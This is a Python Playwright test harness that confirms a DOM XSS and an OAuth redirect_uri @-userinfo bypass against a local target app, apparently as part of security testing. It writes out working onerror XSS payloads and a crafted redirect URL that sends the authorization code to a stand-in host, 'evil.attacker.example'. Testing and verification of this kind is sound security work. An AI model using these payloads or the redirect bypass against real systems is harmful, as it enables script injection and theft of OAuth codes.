"""
Phase 3 Playwright harness — verifies that:

1. DOM XSS — payload in location.hash actually EXECUTES in a real browser
2. OAuth @-userinfo bypass — the browser actually navigates cross-origin
   per RFC 3986 userinfo parsing, transferring the auth code to attacker

Both tests were "source-verified" in Phase 2F but never executed in a real
browser DOM. This harness closes that gap.
"""
import sys
import time
from urllib.parse import urlparse
from playwright.sync_api import sync_playwright


def section(label):
    print()
    print("=" * 65)
    print(label)
    print("=" * 65)


def test_dom_xss_alert():
    """Test 1a — classic alert XSS via location.hash injection.

    Verifies that the payload's script runs by listening to the page's
    `dialog` event (alert/confirm/prompt). If the alert fires, DOM XSS
    is confirmed at execution-time.
    """
    section("TEST 28a — DOM XSS execution via alert dialog")
    payload = '<img src=x onerror="alert(\'xss-via-playwright-2026\')">'

    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        page = browser.new_page()

        alerts_seen = []
        page.on("dialog", lambda d: (alerts_seen.append(d.message), d.dismiss()))

        url = f"http://localhost:58020/dom-xss#{payload}"
        print(f"  Navigating to: {url}")
        page.goto(url, wait_until="networkidle")
        time.sleep(0.5)

        if alerts_seen:
            print(f"  ✓ ALERT FIRED — message: {alerts_seen[0]}")
            result = "PASS"
        else:
            print("  ✗ no alert dialog observed")
            result = "FAIL"

        browser.close()
    return result


def test_dom_xss_window_var():
    """Test 1b — non-dialog XSS via window variable injection.

    Sometimes alert() is suppressed by CSP or pop-up blockers; a better
    primitive sets a window variable then queries it from the harness.
    """
    section("TEST 28b — DOM XSS execution via window variable")
    payload = '<img src=x onerror="window.bughunter_xss_executed=true">'

    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        page = browser.new_page()

        url = f"http://localhost:58020/dom-xss#{payload}"
        print(f"  Navigating to: {url}")
        page.goto(url, wait_until="networkidle")
        time.sleep(0.5)

        executed = page.evaluate("window.bughunter_xss_executed === true")
        if executed:
            print("  ✓ window.bughunter_xss_executed === true — JS executed in DOM")
            result = "PASS"
        else:
            html = page.evaluate("document.getElementById('result').outerHTML")
            print("  ✗ payload did not execute. result div HTML:")
            print(f"    {html[:300]}")
            result = "FAIL"

        browser.close()
    return result


def test_oauth_userinfo_bypass():
    """Test 2 — OAuth @-userinfo bypass actually transfers the auth code
    cross-origin.

    Server validates redirect_uri by prefix-match (starts with
    `http://localhost:58020`, per target_app.py). Attacker sends a redirect_uri of:
       http://localhost:58020@evil.attacker.example/attacker-callback
    Per RFC 3986 the authority ends at the first `/`, so the browser parses:
       scheme:   http
       userinfo: localhost:58020            (credentials — ignored for navigation)
       host:     evil.attacker.example
       path:     /attacker-callback
    The string still starts with `http://localhost:58020`, so the server
    prefix-check passes — yet the browser navigates to evil.attacker.example.
    (The earlier `.../legit/@host/...` form is WRONG: the `@` lands in the path,
    not userinfo, so the browser stays on localhost and the test refutes a real bug.)

    This test verifies BROWSER BEHAVIOR — not server behavior. The
    server-side Phase 2F verification already showed the prefix check
    passes; this completes the chain by confirming the browser actually
    sends the code to attacker.
    """
    section("TEST 29 — OAuth @-userinfo bypass: browser navigation verification")
    # Use a fake attacker host that we'll intercept via Playwright
    # We can't easily run a second server on a free port reliably; instead
    # we use Playwright's request interception to capture the final URL.

    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        page = browser.new_page()

        # Build the malicious redirect_uri
        evil_host = "evil.attacker.example"  # browser will fail to resolve;
                                              # we capture the navigation attempt first
        # `@` must sit right after the registered prefix so localhost:58020 becomes
        # USERINFO and evil_host becomes the real host (RFC 3986) — while the string
        # still startswith the server's allowed prefix `http://localhost:58020`.
        redirect_uri = f"http://localhost:58020@{evil_host}/attacker-callback"
        from urllib.parse import quote
        oauth_url = f"http://localhost:58020/oauth/authorize?client_id=acme-spa&redirect_uri={quote(redirect_uri, safe='')}"

        # Capture all navigation attempts
        navigations = []
        page.on("framenavigated", lambda f: navigations.append(f.url))
        # Also capture failed requests (DNS for evil.attacker.example will fail)
        failed_requests = []
        page.on("requestfailed", lambda r: failed_requests.append((r.url, r.failure)))

        print(f"  Sending OAuth request:")
        print(f"    {oauth_url[:120]}...")
        print()

        try:
            page.goto(oauth_url, wait_until="domcontentloaded", timeout=5000)
        except Exception as e:
            # Navigation to evil.attacker.example fails (DNS error) — that's EXPECTED
            print(f"  (Final navigation failed as expected — destination is unresolvable: {type(e).__name__})")

        print()
        print("  All navigation attempts (in order):")
        for i, url in enumerate(navigations):
            parsed = urlparse(url)
            print(f"    {i+1}. host={parsed.hostname or '?'}  port={parsed.port or '?'}  path={parsed.path or '/'}")

        if failed_requests:
            print()
            print("  Failed requests (DNS-blocked destinations):")
            for url, fail in failed_requests:
                parsed = urlparse(url)
                print(f"    - host={parsed.hostname}  path={parsed.path}  err={fail}")

        # Analysis: did the browser end up trying to talk to evil_host?
        attempted_evil = any(urlparse(u).hostname == evil_host for u in navigations)
        attempted_evil_in_failed = any(urlparse(u).hostname == evil_host for u, _ in failed_requests)

        if attempted_evil or attempted_evil_in_failed:
            print()
            print(f"  ✓ Browser navigated to host={evil_host} after the OAuth redirect.")
            print("    Auth code would have been sent to attacker per RFC 3986 userinfo parsing.")
            result = "PASS"
        else:
            print()
            print(f"  ✗ Browser did NOT navigate to {evil_host} — userinfo bypass did not trigger.")
            print("    (Either Werkzeug normalized the URL, or the browser parsed it differently.)")
            result = "FAIL"

        browser.close()
    return result


def main():
    results = []
    results.append(("DOM XSS via alert dialog", test_dom_xss_alert()))
    results.append(("DOM XSS via window variable", test_dom_xss_window_var()))
    results.append(("OAuth @-userinfo browser navigation", test_oauth_userinfo_bypass()))

    section("SUMMARY")
    for name, status in results:
        marker = "✓" if status == "PASS" else "✗"
        print(f"  {marker}  {name}: {status}")
    print()
    fails = [name for name, status in results if status != "PASS"]
    if not fails:
        print("All browser-execution gates PASSED.")
        return 0
    print(f"FAILS: {fails}")
    return 1


if __name__ == "__main__":
    sys.exit(main())
